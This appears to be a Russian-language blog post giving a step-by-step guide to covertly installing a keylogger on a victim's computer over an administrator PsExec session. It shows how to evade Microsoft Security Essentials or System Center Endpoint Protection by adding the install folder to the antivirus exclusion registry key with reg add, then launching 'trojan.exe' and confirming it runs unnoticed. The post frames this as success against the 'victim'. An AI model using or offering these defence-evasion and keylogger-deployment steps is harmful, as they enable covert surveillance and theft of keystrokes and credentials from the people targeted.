---
title: "Удалённая установка кейлоггера на компьютер с Microsoft Security Essentials или System Center Endpoint Protection"
date: 2015-02-15
---

**Дано:** Сессия PsExec (либо любая другая удаляющая) с администраторными привилегиями на машине жертвы. У жертвы установлен Microsoft Security Essentials либо System Center Endpoint Protection.  
**Задача:** Незаметно для жертвы установить кейлоггер.  
  
Разберём неправльный и правильный способ решения данной задачи.  
  


###  **Неправильный способ**

**  
**

Для начала проверим, что пройзойдёт, если попытаться, если попытаться установить логгер "в лоб" без всяких ухищрений. Собираем бинарник, задаём в качества рабочего директории что-нибудь неприемлемое, например  **c:\Windows\SysWOW64\WindowsPowerShell\**  
  
1\. Открываем сессию PsExec  

[![](/images/1.1.jpg)](/images/1.1.jpg)  
  


2\. Кидаем установщик логгера в директорию **c:\Windows\SysWOW64\WindowsPowerShell\**  и запускаем  

**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**  
**  
**  


[![](/images/8.1.jpg)](/images/8.1.jpg)  


  


Ищем процесс кейлоггера

  


**tasklist /fi "IMAGENAME eq VME.exe"**

  


[![](/images/3.jpg)](/images/3.jpg)

  
  

  

Его нет. А почему? Да потому что, антивирус успешно отработал и радостно сообщил об этом жертве.

  
  

[![](/images/4.jpg)](/images/4.jpg)

  


  


[![](/images/5.jpg)](/images/5.jpg)

  

  

Опeрация провалена...

  


###  Правильный способ

  


Теперь пойдём другим путём и установим логгер в директорию, которая не будет проверяться антивирусом.  

Список исключений для Microsoft Security Essentials хранится в ключе реестра **HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths**  
  
1\. Для начала проверим его содержимое

  


**reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**

  


[![](/images/6.jpg)](/images/6.jpg)

  


  

2. Добавим в исключения директорию **c:\Windows\SysWOW64\WindowsPowerShell\**


**reg add "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths" /v c:\Windows\SysWOW64\WindowsPowerShell\ /d "1" /t REG_DWORD**

  


и проверим результат

  


**reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**

  


  


[![](/images/7.1.jpg)](/images/7.1.jpg)

  
  
3\. Помещаем логгер в выборный нами каталог и запускаем его

  


**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**

  


[![](/images/8.1.jpg)](/images/8.1.jpg)

  


Проверяем результат:

  


**tasklist /fi "IMAGENAME eq VME.exe"**

  


[![](/images/9.jpg)](/images/9.jpg)

  

  

PROFIT! Логгер записен, а антивирус жертвы ни о чём не подозревает
